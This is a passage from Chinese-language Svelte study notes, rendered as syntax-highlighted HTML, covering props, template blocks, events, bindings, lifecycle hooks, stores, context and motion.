abort running fetch() requests, it only prevents</span>\n            <span class=\"token comment\">// them from overriding the store.</span>\n            <span class=\"token comment\">// To learn about canceling fetch requests, search the internet for `AbortController`</span>\n            <span class=\"token function-variable function\">set</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Updating `$package_name` will asynchronously update `$download_count`</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n</code></pre><h2 id=\"props（屬性傳遞）\">Props（屬性傳遞）</h2>\n<ul>\n<li>想使用 props 傳入值時，需於 component 中的變數前加上 <code>export</code>\n│ ex. <code>export let answer;</code>\n├ 此為 svelte 用法，與 Javascript 中的 <code>export</code> 用法不同\n└ 亦可於宣告時指定預設值<code>export let answer = &#39;a mystery&#39;;</code></li>\n<li>就可將值傳入 component 中：<code>&lt;Nested answer={answer}&gt;</code></li>\n<li>亦可使用 <code>{...pkg}</code> 將物件傳進 component 的 props 內\n└ ex. <code>&lt;Info {...pkg}/&gt;</code></li>\n</ul>\n<h2 id=\"邏輯判斷\">邏輯判斷</h2>\n<h3 id=\"分歧\">分歧</h3>\n<ul>\n<li>svelte 提供了各種區塊語法，分歧區塊可依條件決定是否要 render 內容\n│ 各區塊皆以 <code>#</code> 開頭，以 <code>/</code> 結尾，以 <code>:</code> 連接\n└ <code>{#if condition}</code> 開頭，<code>{/if}</code> 結尾</li>\n</ul>\n<pre class=\"language-\"><code class=\"language-\">{#if x > 10}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{x} is greater than 10<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n{:else if 5 > x}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{x} is less than 5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n{:else}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{x} is between 5 and 10<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n{/if}</code></pre><h3 id=\"遞迴\">遞迴</h3>\n<ul>\n<li>遞迴區塊可以遞迴陣列或 array-like 型態的資料\n│ <code>{#each 變數 as 區域變數, index}</code> 開頭，<code>{/each}</code> 結尾\n└ 其中可使用如 <code>{區域變數.值}</code> 顯示內容</li>\n<li>也可先解構內容後再顯示\n└ <code>{#each 變數 as { 值1, 值2 }} ... {/each}</code></li>\n<li>替 item 加上 key：<code>{#each things as thing (thing.id)}</code></li>\n</ul>\n<h3 id=\"非同步處理\">非同步處理</h3>\n<pre class=\"language-\"><code class=\"language-\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">export</span> id<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> api <span class=\"token operator\">=</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">/post/</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>id<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span> <span class=\"token operator\">=></span> res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n{#await api}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>...waiting<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n{:then response}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>The response is {response}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n{:catch error}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token style-attr language-css\"><span class=\"token attr-name\"> <span class=\"token attr-name\">style</span></span><span class=\"token punctuation\">=\"</span><span class=\"token attr-value\"><span class=\"token property\">color</span><span class=\"token punctuation\">:</span> red</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{error.message}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n{/await}</code></pre><h2 id=\"事件綁定\">事件綁定</h2>\n<ul>\n<li>bind event：<code>&lt;div on:mousemove={handleMousemove}&gt;&lt;/div&gt;</code>\n└ 也可使用 inline 寫法：<code>&lt;div on:click={() =&gt; console.log(&quot;clicked&quot;);}&gt;&lt;/div&gt;</code></li>\n<li>svelte 也實作了自動註冊和銷毀事件的處理，省去撰寫的麻煩</li>\n<li>bind event 亦可使用修飾子，以 <code>|</code> 加在 even 的後方：\n├ <code>&lt;div on:click|preventDefault={handleClick}&gt;</code>\n│ <code>preventDefault</code>\n│ <code>stopPropagation</code>\n│ <code>passive</code>\n│ <code>capture</code>\n│ <code>once</code>\n└ <code>self</code></li>\n</ul>\n<h3 id=\"event-dispatcher\">Event dispatcher</h3>\n<ul>\n<li>svelte 亦提供了客製化事件的功能</li>\n</ul>\n<p><code>Event.svelte</code>：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> onMount<span class=\"token punctuation\">,</span> createEventDispatcher <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> dispatch <span class=\"token operator\">=</span> <span class=\"token function\">createEventDispatcher</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">onMount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">dispatch</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"completed\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> elapsedTime<span class=\"token operator\">:</span> <span class=\"token number\">3000</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre><p><code>App.svelte</code>：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> Event <span class=\"token keyword\">from</span> <span class=\"token string\">\"./Event.svelte\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> completed <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> name <span class=\"token operator\">=</span> <span class=\"token string\">\"world\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> once <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">handleClick</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"clicked\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n&lt;Event on:completed={() => completed = true}><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Event</span><span class=\"token punctuation\">></span></span>\n\n{#if completed}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">></span></span>Finished<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n{/if}</code></pre><h2 id=\"資料綁定\">資料綁定</h2>\n<ul>\n<li><p>bind data (<code>v-model</code>)：\n├ <code>&lt;input bind:value={name}&gt;</code>\n│ 將值同步更新回變數，或將值反應到 <code>input</code> 上\n├ 也可以用來套用 DOM 屬性\n│ 例如 <code>&lt;input type=&quot;checkbox&quot; bind:checked={isChecked} /&gt;</code>\n└ 或是 <code>&lt;input type=&quot;radio&quot; bind:group={selected} vale={1} /&gt;</code></p>\n</li>\n<li><p>bind DOM 元素\n└ <code>&lt;input type=&quot;text&quot; bind:this=&quot;{inputNode}&quot; /&gt;</code></p>\n</li>\n<li><p>bind class：當變數為 true 時才綁定該 class\n├ <code>class:active={active}</code>\n└ 當 class 與變數同名時，可以省略掉後方的括弧：<code>class:active</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">let</span> active <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token selector\">.btn</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 1em<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> .5em<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token selector\">.active</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> #d7003a<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n&lt;button class=\"btn\" class:active={active} on:click={() => active = !active}>\n  Click me\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></code></pre></li>\n</ul>\n<h2 id=\"生命週期\">生命週期</h2>\n<ul>\n<li>初始化：<code>beforeUpdate</code> -&gt; <code>onMount</code> -&gt; <code>afterUpdate</code></li>\n<li>元件更新：<code>beforeUpdate</code> -&gt; <code>afterUpdate</code></li>\n<li>元件銷毀：<code>onDestroy</code></li>\n<li><code>onMount</code>：在 Svelte 元件掛載時呼叫\n│ 但 SSR 則不會\n└ 回傳函式則會在 unmount／銷毀時呼叫</li>\n<li><code>beforeUpdate</code>：狀態更新後、元件更新前執行\n├ 會在 <code>onMount</code> 之前執行\n│ 因此如 <code>bind</code> 之類於 <code>onMount</code> 階段執行的處理就會報錯\n└ 以及這時狀態資料可能會更新，但還沒反應到 DOM 上</li>\n<li><code>afterUpdate</code>：狀態更新後、元件更新後執行</li>\n<li><code>onDestroy</code>：元件銷毀時執行</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> onMount <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">onMount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// execution here</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h2 id=\"store-和-context\">Store 和 Context</h2>\n<ul>\n<li><p>統一保存資料管理狀態</p>\n</li>\n<li><p>Store 用於資料經常變動並且可能會跨元件使用時\n└ 有 3 個 API，可於元件外宣告，分別為 <code>readable</code>、<code>writable</code>、<code>derived</code></p>\n</li>\n<li><p><code>writable</code>：可以使用 <code>update</code> 或 <code>set</code> 從外部修改 store 的值\n├ <code>import { writable } from &#39;svelte/store&#39;</code>\n│ <code>const countdown = writable(10);</code>\n│ <code>countdown.update(currentValue =&gt; { return 9 });</code>\n└ <code>countodnw.set(9);</code></p>\n</li>\n<li><p><code>readable</code>：只能從內部修改 store 的值\n├ <code>import { readable } from &#39;svelte/store&#39;</code>\n└</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">chatSub <span class=\"token operator\">=</span> <span class=\"token function\">readable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">set</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> chatList <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">...</span>chatList<span class=\"token punctuation\">,</span> chat<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre></li>\n<li><p><code>derived</code>：接收 1 至多個 store 並且加工\n└ <code>import { derived } from &#39;svelte/store&#39;</code>;</p>\n</li>\n<li><p>所有的 svelte store 都有個 <code>subscribe</code> 方法\n├ 當 store 的值有變動行進行通知\n│ 在呼叫後會回傳一個 unsubscribe 函數\n├ 在變數前方加上 <code>$</code> 可以自動 subscribe store\n│ 並同時處理 unsubscribe 邏輯\n└ <code>&lt;span&gt;{$countdonw}&lt;/span&gt;</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> derived <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte/store\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> list <span class=\"token operator\">=</span> <span class=\"token function\">readable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"Do homework\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"sleep\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"programming\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> ids <span class=\"token operator\">=</span> <span class=\"token function\">writable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">const</span> selectedList <span class=\"token operator\">=</span> <span class=\"token function\">derived</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>list<span class=\"token punctuation\">,</span> ids<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token punctuation\">[</span>list<span class=\"token punctuation\">,</span> ids<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> set</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">set</span><span class=\"token punctuation\">(</span>list<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">val<span class=\"token punctuation\">,</span> i</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> ids<span class=\"token punctuation\">.</span><span class=\"token function\">inclueds</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n{$selectedList}</code></pre></li>\n<li><p><code>get</code> 則是取得 store 內的值</p>\n</li>\n<li><p>Context 用於資料幾乎不會變動或跨元件溝通時\n├ 沒有 reactive 效果（ex. subscribe, unsubscribe）\n│ 需要在 svelte 元件中使用才有效果\n├ 只會作用在 svelte 的元件樹中\n└ svelte 會去尋找距離元件最近的 context</p>\n<p><code>App.svelte</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> Profile <span class=\"token keyword\">from</span> <span class=\"token string\">\"./Profile.svelte\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> setContext <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> user <span class=\"token operator\">=</span> <span class=\"token function\">setContext</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n    name<span class=\"token operator\">:</span> <span class=\"token string\">\"Kalan\"</span><span class=\"token punctuation\">,</span>\n    age<span class=\"token operator\">:</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Profile</span> <span class=\"token punctuation\">/></span></span></code></pre><p><code>Profile.svelte</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> getContext <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> user <span class=\"token operator\">=</span> <span class=\"token function\">setContext</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>{user.name}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{user.age}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></code></pre></li>\n</ul>\n<h2 id=\"motion-機制\">motion 機制</h2>\n<ul>\n<li><p><code>Tween</code>：定義兩個數值之間的變化\n├ 可以定義 duration 與 easing\n│ 介面和 writable store 相同\n│ 具有 <code>subscribe</code>、<code>set</code>、<code>update</code> 等方法\n├ <code>import { tweened } from &#39;svelte/motion&#39;;</code>\n│ <code>const value = tweened(10, { duration: 3000 });</code>\n└ <code>{$value}</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> onMount <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> tweened <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte/motion\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> name <span class=\"token operator\">=</span> <span class=\"token string\">\"world\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> year <span class=\"token operator\">=</span> <span class=\"token function\">tweened</span><span class=\"token punctuation\">(</span><span class=\"token number\">1990</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> duration<span class=\"token operator\">:</span> <span class=\"token number\">1500</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">onMount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> year<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token number\">2020</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n{Math.floor($year)}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>Hello {name}!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></code></pre><ul>\n<li><code>Spring</code>：讓物件動畫變得更生動\n├ stiffness 剛性、damping 摩擦係數</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> spring <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte/motion\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> positionX<span class=\"token punctuation\">,</span> positionY<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> image<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> imageURL <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">let</span> position <span class=\"token operator\">=</span> <span class=\"token function\">spring</span><span class=\"token punctuation\">(</span>\n    <span class=\"token punctuation\">{</span>\n      x<span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n      y<span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span>\n      stiffness<span class=\"token operator\">:</span> <span class=\"token number\">0.1</span><span class=\"token punctuation\">,</span>\n      damping<span class=\"token operator\">:</span> <span class=\"token number\">0.5</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">handleMousemove</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    position<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n      x<span class=\"token operator\">:</span> e<span class=\"token punctuation\">.</span>clientX <span class=\"token operator\">-</span> image<span class=\"token punctuation\">.</span>width <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n      y<span class=\"token operator\">:</span> e<span class=\"token punctuation\">.</span>clientY <span class=\"token operator\">-</span> image<span class=\"token punctuation\">.</span>height <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token selector\">img</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> aboslute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 350px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">cursor</span><span class=\"token punctuation\">:</span> move<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span>\n  <span class=\"token attr-name\"><span class=\"token namespace\">bind:</span>this</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{image}<span class=\"token punctuation\">\"</span></span>\n  <span class=\"token attr-name\"><span class=\"token namespace\">on:</span>mousemove</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{handleMousemove}<span class=\"token punctuation\">\"</span></span>\n  <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{imageURL}<span class=\"token punctuation\">\"</span></span><span class=\"token style-attr language-css\"><span class=\"token attr-name\">\n  <span class=\"token attr-name\">style</span></span><span class=\"token punctuation\">=\"</span><span class=\"token attr-value\"><span class=\"token punctuation\">{</span><span class=\"token selector\">`transform: translate($</span><span class=\"token punctuation\">{</span>$position.x<span class=\"token punctuation\">}</span><span class=\"token selector\">px, $</span><span class=\"token punctuation\">{</span>$position.y<span class=\"token punctuation\">}</span>px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>`<span class=\"token punctuation\">}</span></span><span class=\"token punctuation\">\"</span></span>\n<span class=\"token punctuation\">/></span></span></code></pre></li>\n</ul>\n<h2 id=\"transition-機制\">transition 機制</h2>\n<ul>\n<li><p>svelte 內建有 <code>fade</code>、<code>blur</code>、<code>fly</code>、<code>slide</code>、<code>scale</code>、<code>draw</code>、<code>crossfade</code> 等轉場函式</p>\n</li>\n<li><p>svelte 